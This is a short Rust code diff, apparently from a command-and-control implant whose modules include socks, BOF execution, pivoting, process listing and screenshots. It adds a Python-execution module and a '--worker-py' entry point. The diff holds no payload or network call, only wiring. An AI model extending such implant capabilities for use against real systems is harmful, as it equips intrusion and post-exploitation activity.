@@ -12,6 +12,7 @@ mod features {
     pub mod socks;
     pub mod executeBOF;
     pub mod executeDOT;
+    pub mod executePY;
     pub mod list_processes;
     pub mod pivot;
     pub mod screenshot;
@@ -33,6 +34,10 @@ fn main() {
             }
             "--worker-dot" => {
                 worker::run_dot_worker();
+                return;
+            }
+            "--worker-py" => {
+                worker::run_py_worker();
                 return;
             }
             _ => {}
